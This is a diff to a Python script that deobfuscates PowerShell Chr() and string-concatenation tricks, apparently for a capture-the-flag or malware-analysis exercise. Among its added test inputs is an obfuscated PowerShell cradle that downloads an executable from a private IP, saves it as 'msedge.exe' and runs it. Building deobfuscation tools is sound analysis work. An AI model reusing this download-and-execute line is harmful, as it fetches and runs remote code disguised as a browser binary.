@@ -3,7 +3,7 @@ import re
 chrregex = re.compile(r'Chr\(([-]?\d+)(\s+(\^|\+|\-|\/|\*|\%)\s+(\d+))*\)', re.IGNORECASE)
 stringregex = re.compile(r'(".*?"|\'.*?.\')')
 
-concatregex = re.compile(r'({chr})(\s*\+\s*({chr}))*'.format(chr=chrregex.pattern, string=stringregex.pattern))
+concatregex = re.compile(r'({chr}|{string})(\s*\+\s*({chr}|{string}))*'.format(chr=chrregex.pattern, string=stringregex.pattern))
 
 def remove_spaces_bracket(match):
     return f"[Char]({match.group(1)}{match.group(2)}{match.group(3)})"
@@ -62,24 +62,26 @@ def concat_test(code):
         results.append(match.group(1))
         remaining_text = match.group(0)[len(match.group(1)):].strip()
         while remaining_text:
-            next_match = re.match(r'\s*\+\s*({chr})'.format(chr=chrregex.pattern, string=stringregex.pattern), remaining_text)
+            next_match = re.match(r'\s*\+\s*({chr}|{string})'.format(chr=chrregex.pattern, string=stringregex.pattern), remaining_text)
             if next_match:
                 results.append(next_match.group(1))
                 remaining_text = remaining_text[next_match.end():].strip()
             else:
                 break
-    gabungin = ''.join([decode_chr(result) if result.startswith('Chr') else result.strip('"') for result in results])
+    gabungin = [decode_chr(result) if result.startswith('Chr') else result.strip('"') for result in results]
     check = code.split('=')
     newcoderes = []    
     for i in range(len(check)):
         newcoderes.append(check_symbols(check[i]))
         if i != len(check) - 1:
             newcoderes.append('=')
-    
     newcode = ''.join([i  for i in newcoderes]).strip('\n')
     code = []
-    for i in range(len(results)):
-        newcode = newcode.replace(results[i], gabungin[i])
+    for i, element in enumerate(gabungin):
+        if len(element) == 1:
+            newcode = newcode.replace(results[i], gabungin[i])
+        else:
+            newcode = newcode.replace("+", "").replace("''", "").replace("'", "").replace(" ", "")
     return newcode
 
 
@@ -94,7 +96,7 @@ $tes = [Char]        70 + [Char](-11   +   100) +               [ChAr](99       
 $tes2 = [ChaR](99   -  10)+[CHAR](109 -bxor   4)
 $tes3 = [ChaR](99 -bxor 13)  +  [CHar](109-bxor   4)
 $tes4 = [ChaR](99+               13)   +   [CHar](109 -bxor 4)
+$tes5 = 'hel'+'lo'
+$u='ht'+'tp://192.168.0.16:8282/B64_dec'+'ode_RkxBR3tEYXl1bV90aGlzX'+'2lzX3NlY3JldF9maWxlfQ%3'+'D%3D/chall_mem_se'+'arch.e'+'xe';$t='Wan'+'iTem'+'p';mkdir -force $env:TMP\..\$t;try{iwr $u -OutFile $d\msedge.exe;& $d\msedge.exe;}catch{}
 """
 print(deobfuscate(testing))
-
-
